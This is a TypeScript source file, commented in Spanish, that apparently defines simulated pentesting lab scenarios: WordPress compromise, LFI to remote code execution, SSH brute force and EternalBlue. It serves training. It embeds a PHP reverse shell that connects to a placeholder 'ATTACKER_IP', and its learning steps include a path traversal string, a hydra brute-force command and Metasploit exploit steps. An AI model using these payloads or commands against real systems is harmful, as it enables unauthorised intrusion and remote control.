// ── exercises/templates.ts ──────────────────────────────────────
// Plantillas reutilizables para crear escenarios de pentesting
// Evita duplicación de código en los archivos de ejercicios

import { assignDHCP } from '../utils/network';
import type { Machine, Scenario, MachineInfo, Port, LearningStep, Mission, FileEntry } from '../types';

// MACs únicas para máquinas atacantes (evita colisiones entre escenarios)
const ATTACKER_MACS = ['08:00:27:AA:BB:CC', '08:00:27:AA:BB:CD', '08:00:27:AA:BB:CE'];
let attackerCount = 0;

// Resetea el contador de MACs al cambiar de escenario
export function resetAttackerCounter() { attackerCount = 0; }

export function createAttackerMachine(networkRange: string, customHostname?: string): Machine {
  const mac = ATTACKER_MACS[attackerCount % ATTACKER_MACS.length];
  attackerCount++;
  return {
    id: 'attacker-01',
    machine_info: { hostname: customHostname || 'kali-attacker', ip: '', mac, os: 'Kali Linux 2023.4', status: 'up', type: 'workstation' },
    discovery_level: 4, scan_results: { ports: [] }, web_enumeration: { web_server: 'none', cms: 'none', directories: [] },
    learning_steps: [], files: [],
  };
}

interface ScenarioBuilderConfig {
  id: string; name: string; description: string;
  difficulty: 'Easy' | 'Medium' | 'Hard';
  category: 'Web' | 'Network' | 'Crypto' | 'Forensics';
  networkRange: string; attackerFiles?: FileEntry[];
  targetMachine: Omit<Machine, 'machine_info' | 'id'> & { id: string; machine_info: Omit<MachineInfo, 'ip'>; ports: Port[] };
  learningSteps: LearningStep[];
}

export function buildScenario(config: ScenarioBuilderConfig): Scenario {
  const attacker = createAttackerMachine(config.networkRange);
  if (config.attackerFiles?.length) attacker.files = config.attackerFiles;
  const target: Machine = {
    ...config.targetMachine,
    machine_info: { ...config.targetMachine.machine_info, ip: '' } as MachineInfo,
    scan_results: { ports: config.targetMachine.ports },
    web_enumeration: config.targetMachine.web_enumeration || { web_server: 'none', cms: 'none', directories: [] },
    discovery_level: 0,
    learning_steps: config.learningSteps.map((step, idx) => ({ ...step, id: idx + 1 })),
    files: config.targetMachine.files || [],
  };
  const machines = assignDHCP(config.networkRange, [attacker, target]);
  const missions: Mission[] = config.learningSteps.map((step, idx) => ({
    id: idx + 1, title: step.task, description: step.text,
    status: idx === 0 ? 'active' : 'pending', targetMachineId: config.targetMachine.id, discoveryLevel: step.discoveryLevel,
  }));
  return {
    id: config.id, name: config.name, description: config.description,
    difficulty: config.difficulty, category: config.category, network_range: config.networkRange,
    initialMachineId: 'attacker-01', machines, missions,
  };
}

export const COMMON_PORTS = {
  ssh: (version = 'OpenSSH 8.2p1 Ubuntu', creds?: { user: string; pass: string }): Port => ({ port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version, credentials: creds }),
  http: (version = 'Apache httpd 2.4.41'): Port => ({ port: 80, protocol: 'tcp', state: 'open', service: 'http', version }),
  https: (version = 'nginx'): Port => ({ port: 443, protocol: 'tcp', state: 'open', service: 'https', version }),
  mysql: (state: 'open' | 'filtered' | 'closed' = 'filtered'): Port => ({ port: 3306, protocol: 'tcp', state, service: 'mysql', version: state === 'open' ? 'MySQL 5.7.38' : 'unknown' }),
  smb: (version = 'Windows 7 Professional 7601'): Port => ({ port: 445, protocol: 'tcp', state: 'open', service: 'microsoft-ds', version }),
  rdp: (): Port => ({ port: 3389, protocol: 'tcp', state: 'open', service: 'ms-wbt-server', version: 'Microsoft Terminal Services' }),
};

export function createWebDirs(paths: Array<{ path: string; status: 200 | 301 | 403 | 404; description: string }>) {
  return paths.map(p => ({ path: p.path, status: p.status, description: p.description }));
}

export function createFile(path: string, content: string, type: 'text' | 'hash' | 'binary' = 'text') {
  return { path, content, type };
}

const REVERSE_SHELL_PAYLOAD = {
  phpSimple: `<?php\n\$ip = "ATTACKER_IP"; \$port = 4444;\n\$sock = fsockopen(\$ip, \$port);\nif(\$sock === false) { echo "No connection"; exit(); }\n\$proc = proc_open('/bin/bash', array(0=>\$sock,1=>\$sock,2=>\$sock), \$pipes);\n?>`,
};

export interface LinuxFileSystemConfig { username?: string; password?: string; shadowPassword?: string; }

export function createLinuxFileSystem(config: LinuxFileSystemConfig = {}) {
  const u = config.username || 'www-data';
  const sp = config.shadowPassword || '$6$rounds=656000$abcdefghijklmnop$1234567890abcdefghijklmnop/1234567890123456';
  return [
    createFile('/etc/passwd', `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:admin,,,:/home/admin:/bin/bash\n${u}:x:1001:1001:${u},,,:/home/${u}:/bin/bash`, 'text'),
    createFile('/etc/shadow', `root:${sp}:18000:0:99999:7:::\ndaemon:*:18000:0:99999:7:::\nwww-data:*:18000:0:99999:7:::`, 'text'),
    createFile('/etc/hostname', 'target-server', 'text'),
    createFile('/etc/os-release', 'NAME="Ubuntu"\nVERSION="20.04.5 LTS"\nID=ubuntu\nPRETTY_NAME="Ubuntu 20.04.5 LTS"\nVERSION_ID=20.04', 'text'),
    createFile('/var/www/html/index.html', '<!DOCTYPE html>\n<html><head><title>Web Server</title></head>\n<body><h1>Welcome to Apache2 Ubuntu Default Page</h1></body></html>', 'text'),
    createFile('/var/www/html/.htaccess', '# AuthType Basic\n# AuthName "Restricted Area"\n# AuthUserFile /var/www/html/.htpasswd', 'text'),
    createFile('/home/admin/.bashrc', 'export PATH="$HOME/bin:$PATH"\nalias ll="ls -l"\nalias la="ls -la"', 'text'),
    createFile('/home/admin/.bash_history', 'ls -la\npwd\ncat /etc/passwd\nsudo su\nwhoami', 'text'),
    createFile('/root/.bashrc', 'export PATH="/root/bin:$PATH"\nalias ll="ls -l"', 'text'),
    createFile('/var/log/auth.log', 'Mar 19 10:23:45 target-server sshd[1234]: Accepted password for admin from 192.168.1.100 port 54321 ssh2\nMar 19 10:24:12 target-server sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash', 'text'),
    createFile('/etc/apache2/apache2.conf', '# ServerAdmin webmaster@localhost\n# DocumentRoot /var/www/html\n# <Directory /var/www/html>\n#   Options Indexes FollowSymLinks\n#   AllowOverride All\n# </Directory>', 'text'),
  ];
}

export const SCENARIO_TEMPLATES = {
  wordpress: (config: { id: string; name: string; networkRange: string; wpVersion?: string; flags: { user: string; root: string }; credentials: { user: string; pass: string } }): ScenarioBuilderConfig => ({
    id: config.id, name: config.name,
    description: 'Enumeración web, descubrimiento de directorios y compromiso de WordPress.',
    difficulty: 'Easy', category: 'Web', networkRange: config.networkRange,
    targetMachine: {
      id: `lab-${config.id}-wp`, machine_info: { hostname: 'vulnerable-wp-lab', mac: '08:00:27:A1:B2:C3', os: 'Ubuntu 20.04 LTS', status: 'up', type: 'server' },
      discovery_level: 0, scan_results: { ports: [] }, learning_steps: [],
      ports: [COMMON_PORTS.ssh('OpenSSH 8.2p1 Ubuntu', config.credentials), COMMON_PORTS.http('Apache httpd 2.4.41'), COMMON_PORTS.mysql('filtered')],
      web_enumeration: { web_server: 'Apache/2.4.41', cms: `WordPress ${config.wpVersion || '6.0'}`, directories: [
        { path: '/', status: 200, description: 'Página principal' }, { path: '/wp-admin', status: 200, description: 'Panel de administración' },
        { path: '/uploads', status: 200, description: 'Directorio de archivos subidos' }, { path: '/backup', status: 403, description: 'Copia de seguridad (Acceso denegado)' },
      ]},
      files: [...createLinuxFileSystem({ username: 'admin' }), createFile('/home/admin/user.txt', config.flags.user), createFile('/root/flag.txt', config.flags.root),
        createFile('/uploads/config.bak', `DB_USER=${config.credentials.user}\nDB_PASS=${config.credentials.pass}`, 'text')],
    },
    learningSteps: [
      { id: 1, task: 'Reconocimiento de red', text: 'Descubrir hosts activos: arp-scan <network/cidr>', targetMachineId: `lab-${config.id}-wp`, discoveryLevel: 1 },
      { id: 2, task: 'Escaneo de puertos', text: 'Escanear puertos: nmap -sV <target-ip>', targetMachineId: `lab-${config.id}-wp`, discoveryLevel: 2 },
      { id: 3, task: 'Enumeración Web', text: 'Acceder al sitio web desde el botón de Firefox.', targetMachineId: `lab-${config.id}-wp`, discoveryLevel: 2 },
      { id: 4, task: 'Descubrimiento de directorios', text: 'Enumerar rutas: gobuster dir -u http://<target-ip> -w rockyou.txt', targetMachineId: `lab-${config.id}-wp`, discoveryLevel: 3 },
      { id: 5, task: 'Compromiso del servidor', text: 'Buscar credenciales en /uploads y acceder a /wp-admin.', targetMachineId: `lab-${config.id}-wp`, discoveryLevel: 4 },
    ],
  }),

  lfiRce: (config: { id: string; name: string; networkRange: string; flags: { root: string } }): ScenarioBuilderConfig => ({
    id: config.id, name: config.name,
    description: 'Explota LFI para ejecutar una shell remota (RCE).',
    difficulty: 'Medium', category: 'Web', networkRange: config.networkRange,
    attackerFiles: [createFile('/root/payload.php', REVERSE_SHELL_PAYLOAD.phpSimple, 'text')],
    targetMachine: {
      id: `lab-${config.id}-lfi`, machine_info: { hostname: 'dev-portal-backup', mac: '08:00:27:D6:E7:F8', os: 'Debian 11 (Bullseye)', status: 'up', type: 'server' },
      discovery_level: 0, scan_results: { ports: [] }, learning_steps: [],
      ports: [COMMON_PORTS.http('Apache/2.4.52 (Debian)'), COMMON_PORTS.ssh('OpenSSH 8.4p1 Debian')],
      web_enumeration: { web_server: 'Apache/2.4.52', cms: 'Custom PHP Portal', directories: [
        { path: '/', status: 200, description: 'Página principal' }, { path: '/upload.php', status: 200, description: 'Subida de archivos' },
      ]},
      files: [...createLinuxFileSystem({ username: 'www-data' }), createFile('/var/www/html/flag.txt', config.flags.root)],
    },
    learningSteps: [
      { id: 1, task: 'Reconocimiento', text: 'Descubrir host: arp-scan <network/cidr>', targetMachineId: `lab-${config.id}-lfi`, discoveryLevel: 1 },
      { id: 2, task: 'Escaneo', text: 'Escanear servicios: nmap -sV <target-ip>', targetMachineId: `lab-${config.id}-lfi`, discoveryLevel: 2 },
      { id: 3, task: 'LFI Discovery', text: 'Prueba leer archivos: ?page=../../../../etc/passwd', targetMachineId: `lab-${config.id}-lfi`, discoveryLevel: 3 },
      { id: 4, task: 'Setup Listener', text: 'Prepara escucha: nc -nlvp 4444', targetMachineId: `lab-${config.id}-lfi`, discoveryLevel: 3 },
      { id: 5, task: 'Preparar Payload', text: 'Lee payload.php: cat /root/payload.php y sube el contenido en mantenimiento.', targetMachineId: `lab-${config.id}-lfi`, discoveryLevel: 3 },
      { id: 6, task: 'Remote Code Execution', text: 'Ejecuta: ?page=uploads/payload.php', targetMachineId: `lab-${config.id}-lfi`, discoveryLevel: 4 },
    ],
  }),

  sshBrute: (config: { id: string; name: string; networkRange: string; flags: { root: string }; credentials: { user: string; pass: string } }): ScenarioBuilderConfig => ({
    id: config.id, name: config.name,
    description: 'Escaneo de red y ataque de fuerza bruta por SSH.',
    difficulty: 'Easy', category: 'Network', networkRange: config.networkRange,
    targetMachine: {
      id: `lab-${config.id}-ssh`, machine_info: { hostname: 'ssh-target-lab', mac: '08:00:27:B2:C3:D4', os: 'Ubuntu 22.04 LTS', status: 'up', type: 'server' },
      discovery_level: 0, scan_results: { ports: [] }, learning_steps: [],
      ports: [COMMON_PORTS.ssh('OpenSSH 8.9p1 Ubuntu', config.credentials), { port: 8080, protocol: 'tcp', state: 'open', service: 'http-alt', version: 'nginx/1.18.0' }],
      web_enumeration: { web_server: 'nginx/1.18.0', cms: 'none', directories: [] },
      files: [...createLinuxFileSystem({ username: 'root' }), createFile('/root/flag.txt', config.flags.root)],
    },
    learningSteps: [
      { id: 1, task: 'Reconocimiento de red', text: 'Descubrir hosts: arp-scan <network/cidr>', targetMachineId: `lab-${config.id}-ssh`, discoveryLevel: 1 },
      { id: 2, task: 'Escaneo de puertos', text: 'Identificar servicios: nmap -sV <target-ip>', targetMachineId: `lab-${config.id}-ssh`, discoveryLevel: 2 },
      { id: 3, task: 'Fuerza bruta SSH', text: 'Obtener credenciales: hydra -l root -P rockyou.txt <target-ip> ssh', targetMachineId: `lab-${config.id}-ssh`, discoveryLevel: 3 },
      { id: 4, task: 'Acceso por SSH', text: 'Conectarse: ssh root@<target-ip> <password>', targetMachineId: `lab-${config.id}-ssh`, discoveryLevel: 4 },
    ],
  }),

  eternalBlue: (config: { id: string; name: string; networkRange: string; flags: { root: string } }): ScenarioBuilderConfig => ({
    id: config.id, name: config.name,
    description: 'Explotación EternalBlue en Windows 7 sin parchear mediante Metasploit.',
    difficulty: 'Medium', category: 'Network', networkRange: config.networkRange,
    targetMachine: {
      id: 'win7-target', machine_info: { hostname: 'WIN7-TARGET', mac: '08:00:27:C4:D5:E6', os: 'Windows 7 Professional SP1 x64', status: 'up', type: 'workstation' },
      discovery_level: 0, scan_results: { ports: [] }, learning_steps: [],
      ports: [
        { port: 135, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
        { port: 139, protocol: 'tcp', state: 'open', service: 'netbios-ssn', version: 'Microsoft Windows netbios-ssn' },
        COMMON_PORTS.smb('Windows 7 Professional 7601 Service Pack 1'),
        { port: 49152, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
      ],
      web_enumeration: { web_server: 'none', cms: 'none', directories: [] },
      files: [createFile('C:\\\\Users\\\\Administrator\\\\Desktop\\\\flag.txt', config.flags.root), createFile('C:\\\\Windows\\\\System32\\\\config\\\\SAM', '[SAM Database — use hashdump]', 'binary')],
    },
    learningSteps: [
      { id: 1, task: 'Reconocimiento de red', text: 'Descubrir hosts: arp-scan <network/cidr>', targetMachineId: 'win7-target', discoveryLevel: 1 },
      { id: 2, task: 'Escaneo de puertos', text: 'Identificar servicios: nmap -sV <target-ip>', targetMachineId: 'win7-target', discoveryLevel: 2 },
      { id: 3, task: 'Verificar vulnerabilidad', text: 'msfconsole: use auxiliary/scanner/smb/smb_ms17_010 → set RHOSTS → run', targetMachineId: 'win7-target', discoveryLevel: 2 },
      { id: 4, task: 'Explotar EternalBlue', text: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS/LHOST → exploit', targetMachineId: 'win7-target', discoveryLevel: 3 },
      { id: 5, task: 'Verificar acceso SYSTEM', text: 'meterpreter: getuid', targetMachineId: 'win7-target', discoveryLevel: 4 },
    ],
  }),
};